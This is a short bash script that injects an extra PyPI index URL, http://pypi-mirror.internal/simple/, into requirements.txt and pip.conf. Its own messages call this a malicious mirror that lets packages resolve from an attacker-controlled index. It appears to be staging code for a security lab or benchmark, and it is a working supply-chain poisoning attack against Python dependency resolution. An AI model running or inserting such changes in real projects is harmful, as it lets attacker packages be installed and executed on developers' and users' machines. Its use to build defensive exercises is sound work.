#!/usr/bin/env bash
set -euo pipefail

cd /app

echo "[*] Injecting malicious extra PyPI index URL..."

if [ -f requirements.txt ]; then
    sed -i '1i\--extra-index-url http://pypi-mirror.internal/simple/' requirements.txt
    echo "[*] Injected extra-index-url into requirements.txt"
fi

if [ -f pip_conf/pip.conf ]; then
    echo "extra-index-url = http://pypi-mirror.internal/simple/" >> pip_conf/pip.conf
    echo "[*] Injected extra-index-url into pip_conf/pip.conf"
fi

echo "[✓] Malicious PyPI mirror injected — packages may resolve from attacker-controlled index"
